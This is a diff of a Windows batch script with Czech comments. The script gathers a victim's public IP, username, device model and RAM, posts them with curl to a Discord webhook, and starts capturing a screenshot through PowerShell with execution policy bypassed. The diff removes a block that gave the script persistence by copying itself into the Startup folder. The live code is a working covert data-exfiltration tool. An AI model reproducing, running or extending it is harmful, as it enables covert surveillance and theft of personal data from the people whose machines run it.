@@ -5,12 +5,6 @@ setlocal EnableDelayedExpansion
 :: 🌐 Webhook
 set "webhook=https://discord.com/api/webhooks/TVUJ_WEBHOOK"
 
-:: 📂 Samonáprava (TEMP + autostart)
-set "bootbat=%TEMP%\boot.bat"
-set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\boot.bat"
-if not exist "%bootbat%" copy /y "%~f0" "%bootbat%" >nul
-if not exist "%startup%" copy /y "%~f0" "%startup%" >nul
-
 :: 🌍 IP + uživatel
 for /f "delims=" %%x in ('curl -s https://api.ipify.org') do set "ip=%%x"
 set "user=%USERNAME%"
@@ -45,7 +39,7 @@ for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get model') do (
 for /f "skip=1 tokens=* delims=" %%i in ('wmic computersystem get totalphysicalmemory') do set "ramRaw=%%i"
 set /a ram=%ramRaw:~0,-6%
 
-:: 🧾 Zpráva – každý řádek zvlášť, IP s || před i za
+:: 🧾 Zpráva – každý řádek končí ^ (tohle ti pak Discord ukazoval doslova)
 set "msg=🛰️ Systémové info:^
 IP: ||!ip! ||^
 Čas: !timestamp!^
@@ -54,10 +48,10 @@ Zařízení: !deviceType!^
 Model: !deviceModel!^
 RAM: !ram! GB"
 
-:: 📤 Odeslání na webhook (klasicky přes -d)
+:: 📤 Odeslání na webhook
 curl -s -X POST %webhook% -d "content=!msg!" >nul
 
-:: 📸 Screenshot (původní funkční blok)
+:: 📸 Screenshot
 set "ss=%TEMP%\screenshot_%RANDOM%.png"
 powershell -ExecutionPolicy Bypass -Command ^
 "Add-Type -AssemblyName System.Windows.Forms; ^
